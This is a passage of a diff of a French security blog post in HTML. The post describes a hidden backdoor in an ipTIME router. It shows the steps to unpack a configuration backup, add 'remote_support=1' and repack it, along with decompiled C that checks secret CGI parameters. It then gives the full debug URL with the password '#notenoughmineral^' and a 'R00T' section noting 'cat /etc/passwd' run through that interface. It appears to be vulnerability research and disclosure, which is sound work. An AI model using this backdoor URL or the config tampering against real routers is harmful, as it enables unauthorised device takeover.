-</span></span></code></pre></div><p>Une fois le fichier initial décompressé, nous nous retrouvons avec un format de fichier inconnu. Après une recherche ciblée sur la signature <em>raw_nv</em>, il a été possible d&rsquo;identifier une <a
+</span></span></code></pre></div><p>Après une recherche ciblée sur la signature <em>raw_nv</em>, il a été possible d&rsquo;identifier une <a
   class="gblog-markdown__link"
   href="https://depier.re/old/understanding_iptime_configuration_backup_file_format.html"
->ressource</a> donnant des détails sur le mode de fonctionnement de ce format <em>(qui après vérification, concorde bien avec notre cas)</em> et offrant même un script permettant de lire et modifier ce type de configuration.</p>
-<p>Nous allons donc voir comment :</p>
+>ressource</a> donnant des détails sur le mode de fonctionnement de ce format <em>(qui après vérification concorde bien avec notre cas)</em> et offrant même un <a
+  class="gblog-markdown__link"
+  href="https://github.com/DePierre/iptime_utils/tree/master"
+>script</a> permettant de lire et modifier ce type de fichier de configuration.</p>
+<p>Nous allons donc :</p>
 <ol>
 <li>Extraire le contenu du fichier de configuration <em>(config.cfg)</em></li>
 <li>Ajouter la ligne <em>remote_support=1</em> au fichier <em>/etc/iconfig.cfg</em></li>
 <li>Reconstruire le fichier de configuration <em>(qui au passage doit suivre un format bien précis incluant un checksum)</em></li>
 <li>Mettre à jour le routeur avec la nouvelle configuration</li>
 </ol>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 ipTIME_config.py -e config.cfg                                                                                                                 <span class="m">255</span> ↵ skander@mainlab
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 ipTIME_config.py -e config.cfg
 </span></span><span class="line"><span class="cl">PoC <span class="k">for</span> extracting/repacking ipTIME backup configuration file
 </span></span><span class="line"><span class="cl">Warning: only tested on ipTIME n704 v3, firmware version 9.98.6
 </span></span><span class="line"><span class="cl">Extracting ipTIME configuration...
@@ -1042,7 +1338,7 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl">Extraction successful. You can now edit configuration files in ./etc/
 </span></span><span class="line"><span class="cl">Use -c to pack the new configuration
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;remote_support=1&#39;</span> &gt;&gt; etc/iconfig.cfg
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat etc/iconfig.cfg                                                                                                                                          skander@mainlab
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat etc/iconfig.cfg
 </span></span><span class="line"><span class="cl">wantype.wan1<span class="o">=</span>dynamic
 </span></span><span class="line"><span class="cl">dhblock.vlan1<span class="o">=</span><span class="m">0</span>
 </span></span><span class="line"><span class="cl"><span class="nv">ppp_mtu</span><span class="o">=</span><span class="m">1454</span>
@@ -1070,7 +1366,7 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl"><span class="nv">nat_passthrough</span><span class="o">=</span><span class="m">0</span>
 </span></span><span class="line"><span class="cl"><span class="nv">use_local_gateway</span><span class="o">=</span><span class="m">0</span>
 </span></span><span class="line"><span class="cl"><span class="nv">remote_support</span><span class="o">=</span><span class="m">1</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 ipTIME_config.py -c new.cfg                                                                                                                    <span class="m">255</span> ↵ skander@mainlab
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 ipTIME_config.py -c new.cfg
 </span></span><span class="line"><span class="cl">PoC <span class="k">for</span> extracting/repacking ipTIME backup configuration file
 </span></span><span class="line"><span class="cl">Warning: only tested on ipTIME n704 v3, firmware version 9.98.6
 </span></span><span class="line"><span class="cl">Packing new configuration files...
@@ -1080,33 +1376,15 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl">	<span class="o">[</span>+<span class="o">]</span> Creating outer gzip file
 </span></span><span class="line"><span class="cl">Packing successful. You can now upload the configuration file to ipTIME router.
 </span></span></code></pre></div><div class="flex align-center gblog-post__anchorwrap">
-    <h3 id="secret-en-paramètre"
+    <h3 id="un--minerai-secret-en-paramètre"
     >
-        Secret en paramètre
+        Un &quot; <del>minerai</del>&quot; secret en paramètre
     </h3>
-    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#secret-en-paramètre" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Secret en paramètre" href="#secret-en-param%c3%a8tre">
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#un--minerai-secret-en-paramètre" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Un &quot; minerai&quot; secret en paramètre" href="#un--minerai-secret-en-param%c3%a8tre">
         <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
     </a>
 </div>
-<p>La deuxième catégorie de condition semble plutôt direct. Si on reprend la condition au début de la fonction <em>show_debug_screen</em>, on peut voir que le script <strong>/cgi-bin/d.cgi</strong> attend quelques paramètres &ldquo;secrets&rdquo; :</p>
-<div class=table-wrap> <table>
-  <thead>
-      <tr>
-          <th>Paramètre</th>
-          <th>Valeur</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>act</td>
-          <td>1</td>
-      </tr>
-      <tr>
-          <td>aaksjdkfj</td>
-          <td>#notenoughmineral^</td>
-      </tr>
-  </tbody>
-</table> </div>
+<p>La deuxième catégorie de condition semble plutôt claire. Si on reprend la condition au début de la fonction <em>show_debug_screen</em>, on peut voir que le script <strong>/cgi-bin/d.cgi</strong> attend quelques paramètres &ldquo;secrets&rdquo; :</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">show_debug_screen</span><span class="p">(</span><span class="n">undefined4</span> <span class="n">param_1</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="p">{</span>
@@ -1125,20 +1403,59 @@ Bien que son objectif principal soit l&rsquo;analyse de firmwares, il prend en c
 </span></span><span class="line"><span class="cl">         <span class="p">(((</span><span class="n">local_10a</span> <span class="o">==</span> <span class="sc">&#39;r&#39;</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="n">local_109</span> <span class="o">==</span> <span class="sc">&#39;a&#39;</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_108</span> <span class="o">==</span> <span class="sc">&#39;l&#39;</span><span class="p">))))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_107</span> <span class="o">==</span> <span class="sc">&#39;^&#39;</span><span class="p">))))</span>
 </span></span><span class="line"><span class="cl">        <span class="p">))))</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl"><span class="p">...</span>
-</span></span></code></pre></div><blockquote>
+</span></span></code></pre></div><div class=table-wrap> <table>
+  <thead>
+      <tr>
+          <th>Paramètre</th>
+          <th>Valeur</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>act</td>
+          <td>1</td>
+      </tr>
+      <tr>
+          <td>aaksjdkfj</td>
+          <td>#notenoughmineral^</td>
+      </tr>
+  </tbody>
+</table> </div>
+<blockquote>
 <p><strong>En résumé :</strong> il est possible d&rsquo;accéder à l&rsquo;interface cachée via <a
   class="gblog-markdown__link"
   href="http://IP_ROUTEUR/cgi-bin/d.cgi?act=1&amp;aaksjdkfj=#notenoughmineral%5e"
 >http://IP_ROUTEUR/cgi-bin/d.cgi?act=1&amp;aaksjdkfj=#notenoughmineral^</a></p></blockquote>
 <div class="flex align-center gblog-post__anchorwrap">
-    <h1 id="exploitation"
+    <h1 id="r00t"
     >
-        Exploitation
+        R00T
     </h1>
-    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#exploitation" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Exploitation" href="#exploitation">
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#r00t" class="gblog-post__anchor clip flex align-center" aria-label="Anchor R00T" href="#r00t">
         <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
     </a>
 </div>
+<figure style="text-align: center;"><img src="/img/toto/cmd-1.png" /><figcaption style="text-align: center;">Interface de "debug"</figcaption></figure>
+<figure style="text-align: center;"><img src="/img/toto/cmd-2.png" /><figcaption style="text-align: center;">cat /etc/passwd</figcaption></figure>
+<div class="flex align-center gblog-post__anchorwrap">
+    <h1 id="références"
+    >
+        Références
+    </h1>
+    <a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_backdoor/#références" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Références" href="#r%c3%a9f%c3%a9rences">
+        <svg class="gblog-icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+    </a>
+</div>
+<ul>
+<li>[1] <a
+  class="gblog-markdown__link"
+  href="https://depier.re/old/understanding_iptime_configuration_backup_file_format.html"
+>https://depier.re/old/understanding_iptime_configuration_backup_file_format.html</a></li>
+<li>[2] <a
+  class="gblog-markdown__link"
+  href="https://github.com/DePierre/iptime_utils/tree/master"
+>https://github.com/DePierre/iptime_utils/tree/master</a></li>
+</ul>
 
     </section>
   </article>
